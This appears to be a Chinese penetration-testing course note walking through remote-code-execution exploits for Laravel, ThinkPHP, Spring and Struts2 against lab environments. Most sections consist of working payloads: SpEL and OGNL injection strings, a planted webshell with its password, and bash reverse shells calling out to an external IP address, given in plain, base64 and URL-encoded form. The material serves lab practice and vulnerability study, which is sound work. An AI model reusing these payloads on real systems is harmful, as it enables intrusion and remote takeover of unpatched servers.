![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134926080-2042344603.png)

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134930242-224675639.png)

```plain
#知识点：
中间件及框架列表：
IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等
1、开发框架-PHP-Laravel-Thinkphp
2、开发框架-Javaweb-St2-Spring
3、开发框架-Python-django-Flask
4、开发框架-Javascript-Node.js-JQuery

常见语言开发框架：
PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等
JAVA：Spring MyBatis Hibernate Struts2 Springboot等
Python：Django Flask Bottle Turbobars Tornado Web2py等
Javascript：Vue.js Node.js Bootstrap JQuery Angular等

#章节内容：
常见中间件的安全测试：
1、配置不当-解析&弱口令
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击
4、安全应用-框架特定安全漏洞

#前置知识：
-中间件安全测试流程：
1、判断中间件信息-名称&版本&三方
2、判断中间件问题-配置不当&公开漏洞
3、判断中间件利用-弱口令&EXP&框架漏洞

-应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等

-开发框架组件安全测试流程：
1、判断常见语言开发框架类型
2、判断开发框架存在的CVE问题
3、判断开发框架CVE漏洞利用方式

什么是框架：
框架是一个别人写好的成品，要实现什么功能就可以调用里面的内置函数来实现这个功能的操作。

一个网站的源码应用，比如：实现文件上传功能
1.源码采用框架开发的
完全依赖于框架自身的安全机制，安不安全完全取决于这个框架。
比较简单，方便。

2.源码采用原生态开发的
整个的文件上传功能都是自己写的，自己控制，自己过滤。
比较复杂，需要从0开始。
```

- PHP-开发框架安全-Thinkphp&Laravel

Laravel

```plain
-Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。
CVE-2021-3129 RCE
Laravel <= 8.4.2
exp：
https://github.com/zhzyker/CVE-2021-3129
https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP

环境（laravel 远程代码执行 （CVE-2021-3129））：http://vulfocus.io/#/dashboard

项目：https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP
执行：G:\python38\python.exe laravel-CVE-2021-3129-EXP.py http://123.58.236.76:47464
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947717-1310800063.png)

```plain
用哥斯拉连接：webshell地址:http://123.58.236.76:47464/fuckyou.php,密码:pass
用到项目：https://github.com/zhzyker/CVE-2021-3129
执行：G:\python38\python.exe exp.py http://123.58.236.76:47464/
没有任何反应。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947671-307164245.png)

Thinkphp

```plain
Thinkphp-3.X RCE-5.X RCE
ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架
武器库-Thinkphp专检

环境（thinkphp3.2.x 代码执行）：http://vulfocus.io/#/dashboard
可以用工具直接进行检测，选择thinkphp漏洞利用工具_v1.2
参考：https://blog.csdn.net/LYJ20010728/article/details/119304951
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947742-316399120.png)

```plain
访问：http://123.58.236.76:51663/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/22_04_24.log
执行出phpinfo效果。把phpinfo一改，变成后门就可以了
thinkphp5.0.22

启动环境：
cd vulhub-master/thinkphp/5-rce/
sudo docker-compose up -d
参考：https://vulhub.org/#/environments/thinkphp/5-rce/

访问：http://192.168.233.128:8081
放到集成化工具中检测：
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947808-1761637283.png)

```plain
然后还而已在集成化工具中进行命令执行
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947537-945147940.png)

- JAVAWEB-开发框架安全-Spring&Struts2

Spring

```plain
Spring框架是由于软件开发的复杂性而创建的。
1、cve_2017_4971-Spring Web Flow
影响版本：Spring WebFlow 2.4.0 - 2.4.4
参考：https://paper.seebug.org/322/
环境：http://vulfocus.io/#/dashboard


打开环境后，访问登录地址：http://123.58.236.76:36721/login，登录完成后跳转到http://123.58.236.76:36721/hotels/search
进行抓包，然后点击跳转地址：http://123.58.236.76:36721/hotels?searchString=&pageSize=10

最后访问地址：http://123.58.236.76:36721/hotels/booking?execution=e1s1，填写字段Credit Card #:和Credit Card Name:抓包
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947546-1948147594.png)

```plain
提交，抓取数据包，把数据包放出，跳转到页面
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134947986-481562714.png)

```plain
然后在点击confirm，进行抓包，进行数据包替换：
_eventId_confirm=&_csrf=e06e1d86-e083-45f7-b700-567b5f7f5d30&_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/175.178.151.29/5566+0>%261")).start()=vulhub
其中csrf要与数据包的csrf一致。然后监听到会话。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134949302-433606573.png)

```plain
为什么要这样做呢？参考：https://www.cnblogs.com/cute-puli/p/13363752.html

总结一下，就是在订阅图书处，存在一个命令执行，直接调用了两个函数，这两个函数，一个是：addDefaultMappings ,一个是 addModelBindings。
其中，直接控制field这个值的函数是addDefaultMappings，且未做过滤，而addModelBindings是直接获取的java的一个配置文件，由配置文件来确定是否有 binder 节点，如果有，就无法触发代码执行。所以条件有两个：
（1）binder节点为空；
（2） useSpringBeanBinding 默认值（false）未修改。
由此可实际在代码中找到该页面，节点为空（代替命令执行语句）+默认值为false（点击Confirm按钮）

这个是要知道源码，需要知道在哪里触发了这个漏洞。这个是前提条件，在黑盒和白盒中条件不一样，有一些可能需要白盒。
2、cve_2018_1273-Spring Data Commons
Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)
Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)
Spring Data Commons 2.0 to 2.0.5 (Kay SR5)
Spring Data REST 3.0 - 3.0.5 (Kay SR5)

访问：http://123.58.236.76:32594/users
提交抓取数据包，把数据包payload更改就可以了。这个不需要特定地址，只要有POST数据包提交就可以了。

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
但是发生了错误。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134949017-71458415.png)

```plain
在这里有可能是执行不成功，也有可能是执行后没有回显。那么可以用反弹命令来测试一下是否能成功。在java中，反弹命令都需要用到base64编码来进行测试。

反弹命令：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
经过base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=
组合：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}
最终payload：username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}")]=&password=&repeatedPassword=
页面返回正常，但是还是没有反弹成功。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134948635-1920561327.png)

```plain
发现数据包中：Content-Type: application/x-www-form-urlencoded
这个可能是需要编码的，把整一个进行url编码来进行传递。
payload：username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}")]=&password=&repeatedPassword=
URL编码后：%75%73%65%72%6E%61%6D%65%5B%23%74%68%69%73%2E%67%65%74%43%6C%61%73%73%28%29%2E%66%6F%72%4E%61%6D%65%28%22%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%22%29%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%59%6D%46%7A%61%43%41%74%61%53%41%2B%4A%69%41%76%5A%47%56%32%4C%33%52%6A%63%43%38%78%4E%7A%55%75%4D%54%63%34%4C%6A%45%31%4D%53%34%79%4F%53%38%31%4E%54%59%32%49%44%41%2B%4A%6A%45%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%5D%3D%26%70%61%73%73%77%6F%72%64%3D%26%72%65%70%65%61%74%65%64%50%61%73%73%77%6F%72%64%3D
没有任何回显。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134948771-2134611938.png)

```plain
然后把这个命令进行单独编码，看看可不可以。
反弹命令：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}
进行URL编码：%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%59%6D%46%7A%61%43%41%74%61%53%41%2B%4A%69%41%76%5A%47%56%32%4C%33%52%6A%63%43%38%78%4E%7A%55%75%4D%54%63%34%4C%6A%45%31%4D%53%34%79%4F%53%38%31%4E%54%59%32%49%44%41%2B%4A%6A%45%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D
组合：username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%59%6D%46%7A%61%43%41%74%61%53%41%2B%4A%69%41%76%5A%47%56%32%4C%33%52%6A%63%43%38%78%4E%7A%55%75%4D%54%63%34%4C%6A%45%31%4D%53%34%79%4F%53%38%31%4E%54%59%32%49%44%41%2B%4A%6A%45%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D")]=&password=&repeatedPassword=
这样就可以接收到会话。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134949640-2061524184.png)

```plain
3、CVE-2022-22963 Spring Cloud Function Spel表达式注入
Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。

启动环境：
cd /vulhub-master/spring/CVE-2022-22963
sudo docker-compose up -d
参考：https://vulhub.org/#/environments/spring/CVE-2022-22963/

访问：http://192.168.233.128:8088/

访问地址http://192.168.233.128:8088/functionRouter 进行抓包：构造一个post包

反弹命令：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
经过base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=
组合：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}

进行替换数据包：
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}")
接收到会话，完成测试。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134948706-1926198945.png)

```plain
为什么这个不用编码，而上一个需要进行编码才能成功呢？这个是请求头跟请求体的问题，如果数据写在下面的话，就需要进行URL编码。写在请求头中的数据就不需要URL编码。
```

Struts2

```plain
Struts2是一个基于MVC设计模式的Web应用框架

1、2020前漏洞
武器库-st2专检
环境（vulfocus/struts-s2-009:latest）：http://vulfocus.io/#/dashboard

判断Struts2也比较简单，一般看url后缀为.action：http://123.58.236.76:30918/showcase.action
可以用到集成化检测工具，Struts

检测出来也可以进行命令执行。还有很多，都是一样的，打开用工具跑就行。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134949573-1676700360.png)

```plain
2、cve_2020_17530
环境：http://vulfocus.io/#/dashboard
利用工具检测不出来，因为没有集成在里面。

可以在网上找资源，找相关的漏洞
利用脚本：https://github.com/YanMu2020/s2-062

执行：G:\python38\python.exe s2-062.py --url "http://123.58.236.76:43417" --cmd "whoami"
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134948380-591080907.png)

```plain
手工：
Content-Type: multipart/form-data; boundary=----1

------1
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------1--

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}


Content-Type: application/x-www-form-urlencoded

id=%25%7b%28%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%3d%23%61%70%70%6c%69%63%61%74%69%6f%6e%5b%22%6f%72%67%2e%61%70%61%63%68%65%2e%74%6f%6d%63%61%74%2e%49%6e%73%74%61%6e%63%65%4d%61%6e%61%67%65%72%22%5d%29%2e%28%23%73%74%61%63%6b%3d%23%61%74%74%72%5b%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%75%74%69%6c%2e%56%61%6c%75%65%53%74%61%63%6b%2e%56%61%6c%75%65%53%74%61%63%6b%22%5d%29%2e%28%23%62%65%61%6e%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%42%65%61%6e%4d%61%70%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%73%74%61%63%6b%29%29%2e%28%23%63%6f%6e%74%65%78%74%3d%23%62%65%61%6e%2e%67%65%74%28%22%63%6f%6e%74%65%78%74%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%63%6f%6e%74%65%78%74%29%29%2e%28%23%6d%61%63%63%3d%23%62%65%61%6e%2e%67%65%74%28%22%6d%65%6d%62%65%72%41%63%63%65%73%73%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%6d%61%63%63%29%29%2e%28%23%65%6d%70%74%79%73%65%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%48%61%73%68%53%65%74%22%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%61%72%67%6c%69%73%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%41%72%72%61%79%4c%69%73%74%22%29%29%2e%28%23%61%72%67%6c%69%73%74%2e%61%64%64%28%22%77%68%6f%61%6d%69%22%29%29%2e%28%23%65%78%65%63%75%74%65%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%29%29%2e%28%23%65%78%65%63%75%74%65%2e%65%78%65%63%28%23%61%72%67%6c%69%73%74%29%29%7d
3、cve_2021_31805
环境：http://vulfocus.io/#/dashboard
利用工具检测不出来，因为没有集成在里面。

执行：G:\python38\python.exe s2-062.py --url "123.58.236.76:32506/s2_062/index.action" --cmd "whoami"
但是失败了。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134954410-1759785067.png)